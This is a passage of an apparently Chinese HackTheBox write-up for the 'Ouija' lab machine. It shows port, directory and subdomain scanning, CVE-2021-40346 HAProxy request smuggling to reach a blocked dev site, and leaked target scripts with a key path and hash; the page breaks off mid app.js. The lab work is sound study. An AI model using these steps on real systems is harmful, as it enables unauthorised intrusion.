<!DOCTYPE html>
<html>
<head>
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>Ouija - HackTheBox | 喵喵喵喵 | 某鱼唇的人类</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#66CCFF">
    
    
    <meta name="keywords" content="HackTheBox">
    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Ouija 10.10.11.244                                                                                                              端口扫描22,80,3000 1234567891011121">
<meta property="og:type" content="article">
<meta property="og:title" content="Ouija - HackTheBox">
<meta property="og:url" content="https://darkwing.moe/2023/12/05/Ouija-HackTheBox/index.html">
<meta property="og:site_name" content="喵喵喵喵">
<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Ouija 10.10.11.244                                                                                                              端口扫描22,80,3000 1234567891011121">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120401.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120402.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120403.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120404.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120422.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120406.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120407.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120408.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120409.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120410.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120411.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120412.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120413.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120414.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120415.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120416.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120417.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120418.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120419.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120420.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120421.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120427.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120426.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120428.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120429.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120424.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120430.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120431.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120432.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120433.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120434.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120435.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120423.jpg">
<meta property="article:published_time" content="2023-12-05T11:21:38.000Z">
<meta property="article:modified_time" content="2024-05-20T02:13:21.863Z">
<meta property="article:author" content="暗羽">
<meta property="article:tag" content="HackTheBox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120401.jpg">
    
        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">暗羽</h5>
          <a href="mailto:Discord@darkwing_nya" title="Discord@darkwing_nya" class="mail">Discord@darkwing_nya</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/zjicmDarkWing" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://twitter.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-gratipay"></i>
                Twitter
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-coffee"></i>
                Buy me a coffee
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://darkwing.moe/2015/01/01/about/"  >
                <i class="icon icon-lg icon-link"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Ouija - HackTheBox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Ouija - HackTheBox</h1>
        <h5 class="subtitle">
            
                <time datetime="2023-12-05T11:21:38.000Z" itemprop="datePublished" class="page-time">
  2023-12-05
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#80"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">80</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#3000"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">3000</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#目录扫描"><span class="post-toc-number">3.</span> <span class="post-toc-text">目录扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#server-status"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">server-status</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#users"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">users</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#register"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">register</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#login"><span class="post-toc-number">3.4.</span> <span class="post-toc-text">login</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#子域名扫描"><span class="post-toc-number">4.</span> <span class="post-toc-text">子域名扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ouija-htb"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">ouija.htb</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#dev-ouija-htb"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">dev.ouija.htb</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#gitea-ouija-htb"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">gitea.ouija.htb</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#HA-Proxy"><span class="post-toc-number">4.4.</span> <span class="post-toc-text">HA-Proxy</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#请求走私"><span class="post-toc-number">5.</span> <span class="post-toc-text">请求走私</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#init-sh"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">init.sh</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#app-js"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">app.js</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#LFI"><span class="post-toc-number">6.</span> <span class="post-toc-text">LFI</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#lfi-py"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">lfi.py</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#哈希长度扩展"><span class="post-toc-number">7.</span> <span class="post-toc-text">哈希长度扩展</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#LFI-2"><span class="post-toc-number">8.</span> <span class="post-toc-text">LFI  2</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#leila-id-rsa"><span class="post-toc-number">8.1.</span> <span class="post-toc-text">leila_id_rsa</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#user-flag"><span class="post-toc-number">9.</span> <span class="post-toc-text">user flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#提权信息"><span class="post-toc-number">10.</span> <span class="post-toc-text">提权信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#整数溢出"><span class="post-toc-number">10.1.</span> <span class="post-toc-text">整数溢出</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#debug"><span class="post-toc-number">10.2.</span> <span class="post-toc-text">debug</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#文件写入"><span class="post-toc-number">10.3.</span> <span class="post-toc-text">文件写入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#webshell"><span class="post-toc-number">10.4.</span> <span class="post-toc-text">webshell</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#test-php"><span class="post-toc-number">10.5.</span> <span class="post-toc-text">test.php</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#root-flag"><span class="post-toc-number">11.</span> <span class="post-toc-text">root flag</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#shadow"><span class="post-toc-number">11.1.</span> <span class="post-toc-text">shadow</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">12.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Ouija-HackTheBox"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Ouija - HackTheBox</h1>
        <div class="post-meta">
            <time class="post-time" title="2023-12-05 19:21:38" datetime="2023-12-05T11:21:38.000Z"  itemprop="datePublished">2023-12-05</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li><a href="https://app.hackthebox.com/machines/Ouija" target="_blank" rel="noopener">https://app.hackthebox.com/machines/Ouija</a></li>
<li>10.10.11.244</li>
</ul>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120401.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22,80,3000</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.11.244</span></span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-04 13:30 CST</span><br><span class="line">Nmap scan report for 10.10.11.244</span><br><span class="line">Host is up (0.15s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 6f:f2:b4:ed:1a:91:8d:6e:c9:10:51:71:d5:7c:49:bb (ECDSA)</span><br><span class="line">|_  256 df:dd:bc:dc:57:0d:98:af:0f:88:2f:73:33:48:62:e8 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.52</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line">3000/tcp open  http    Node.js Express framework</span><br><span class="line">|_http-title: Site doesn't have a title (application/json; charset=utf-8).</span><br><span class="line">Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 57.08 seconds</span><br></pre></td></tr></table></figure>



<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>直接访问是apache默认页面：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120402.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="3000"><a href="#3000" class="headerlink" title="3000"></a>3000</h2><p>直接访问是这个响应：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120403.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><p>目录扫描发现80的server-status可以访问，以及3000端口那里一些端点：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt  -t 50 -u http://10.10.11.244/</span><br><span class="line"></span><br><span class="line">/server-status        (Status: 200) [Size: 17257]</span><br><span class="line"></span><br><span class="line">gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt  -t 50 -u http://10.10.11.244:3000/  --exclude-length 31</span><br><span class="line"></span><br><span class="line">/Login                (Status: 200) [Size: 42]</span><br><span class="line">/login                (Status: 200) [Size: 42]</span><br><span class="line">/register             (Status: 200) [Size: 26]</span><br><span class="line">/users                (Status: 200) [Size: 25]</span><br></pre></td></tr></table></figure>

<h2 id="server-status"><a href="#server-status" class="headerlink" title="server-status"></a>server-status</h2><p>可以看到一些请求记录,并且其中可以得到域名 ouija.htb：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120404.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="users"><a href="#users" class="headerlink" title="users"></a>users</h2><p>直接访问提示缺少ihash header，测试添加后提示缺少identification header，添加identification后是token无效：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120422.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="register"><a href="#register" class="headerlink" title="register"></a>register</h2><p>注册被禁用：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120406.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>需要账号密码：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120407.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h1><p>根据前面得到的域名，添加hosts后扫描子域名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.244 ouija.htb</span><br></pre></td></tr></table></figure>

<p>看起来是任意<code>dev*</code>的结果都是403，但响应时间有差异，过滤掉小于100毫秒的结果(自己根据实际情况调整)才是真的可用结果：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://ouija.htb/" -H 'Host: FUZZ.ouija.htb' -fs 0,10671 -ft '&lt;100'</span><br><span class="line"></span><br><span class="line">[Status: 403, Size: 93, Words: 6, Lines: 4, Duration: 255ms]</span><br><span class="line">    * FUZZ: dev</span><br></pre></td></tr></table></figure>

<h2 id="ouija-htb"><a href="#ouija-htb" class="headerlink" title="ouija.htb"></a>ouija.htb</h2><p>基于web的管理系统：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120408.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>并且根据记录，主站会尝试加载gitea那里的tracking.js，所以还存在一个gitea子域名：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120409.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="dev-ouija-htb"><a href="#dev-ouija-htb" class="headerlink" title="dev.ouija.htb"></a>dev.ouija.htb</h2><p>被管理员规则禁止：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120410.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="gitea-ouija-htb"><a href="#gitea-ouija-htb" class="headerlink" title="gitea.ouija.htb"></a>gitea.ouija.htb</h2><p>gitea可以直接访问,探索里可以公开访问ouija-htb repo：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120411.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="HA-Proxy"><a href="#HA-Proxy" class="headerlink" title="HA-Proxy"></a>HA-Proxy</h2><p>gitea repo中提到HA-Proxy版本2.2.16：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120412.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>可以搜到存在请求走私：</p>
<ul>
<li>alexOarga/CVE-2021-40346: CVE-2021-40346 - HaProxy HTTP request smuggling through integer overflow<br><a href="https://github.com/alexOarga/CVE-2021-40346" target="_blank" rel="noopener">https://github.com/alexOarga/CVE-2021-40346</a></li>
<li>HAProxy vulnerability enables HTTP request smuggling attacks | The Daily Swig<br><a href="https://portswigger.net/daily-swig/haproxy-vulnerability-enables-http-request-smuggling-attacks" target="_blank" rel="noopener">https://portswigger.net/daily-swig/haproxy-vulnerability-enables-http-request-smuggling-attacks</a></li>
<li>Critical vulnerability in HAProxy | JFrog Security Research Team<br><a href="https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/" target="_blank" rel="noopener">https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/</a></li>
<li>Client-Side Desync - PortSwigger - YouTube<br><a href="https://www.youtube.com/watch?v=6wVb6KSmras&amp;ab_channel=Txhaka" target="_blank" rel="noopener">https://www.youtube.com/watch?v=6wVb6KSmras&amp;ab_channel=Txhaka</a></li>
</ul>
<h1 id="请求走私"><a href="#请求走私" class="headerlink" title="请求走私"></a>请求走私</h1><p>根据参考资料中的poc，尝试通过请求走私访问dev子域成功，注意需要关掉burp的自动内容长度更新，然后自己根据实际请求手动指定Content-Length：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120413.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>根据结果可以看到通过editor.php去加载两个文件的请求，同样利用请求走私来进行请求：</p>
<h2 id="init-sh"><a href="#init-sh" class="headerlink" title="init.sh"></a>init.sh</h2><p>看起来是初始化api config的，应该是前面看到的3000端口那边的：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">echo "$(date) api config starts" &gt;&gt;</span><br><span class="line">mkdir -p .config/bin .config/local .config/share /var/log/zapi</span><br><span class="line">export k=$(cat /opt/auth/api.key)</span><br><span class="line">export botauth_id="bot1:bot"</span><br><span class="line">export hash="4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1"</span><br><span class="line">ln -s /proc .config/bin/process_informations</span><br><span class="line">echo "$(date) api config done" &gt;&gt; /var/log/zapi/api.log</span><br><span class="line"></span><br><span class="line">exit 1</span><br></pre></td></tr></table></figure>

<h2 id="app-js"><a href="#app-js" class="headerlink" title="app.js"></a>app.js</h2><p>根据代码，需要identification通过校验后才能使用管理员功能例如/file/get：</p>
<p>它以 base64 + 十六进制解码identification header，将其附加到key并获取 sha256 哈希值,如果它与通过 ihash header传递的哈希相匹配，则它可以工作</p>
<p>而key是从 .env 文件中获取的的， <code>const key = process.env.k</code></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120414.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> crt = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">var</span> b85 = <span class="built_in">require</span>(<span class="string">'base85'</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> key = process.env.k;</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, ()=&gt;&#123; <span class="built_in">console</span>.log(<span class="string">"listening @ 3000"</span>); &#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params">b</span>)</span>&#123;</span><br><span class="line">    s1=(Buffer.from(b, <span class="string">'base64'</span>)).toString(<span class="string">'utf-8'</span>);</span><br><span class="line">    s2=(Buffer.from(s1.toLowerCase(), <span class="string">'hex'</span>));</span><br><span class="line">    <span class="keyword">return</span> s2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_cookies</span>(<span class="params">identification</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> sha256=crt.createHash(<span class="string">'sha256'</span>);</span><br><span class="line">    wrap = sha256.update(key);</span><br><span class="line">    wrap = sha256.update(identification);</span><br><span class="line">    hash=sha256.digest(<span class="string">'hex'</span>);</span><br><span class="line">    <span class="keyword">return</span>(hash);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verify_cookies</span>(<span class="params">identification, rhash</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( ((generate_cookies(d(identification)))) === rhash)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;<span 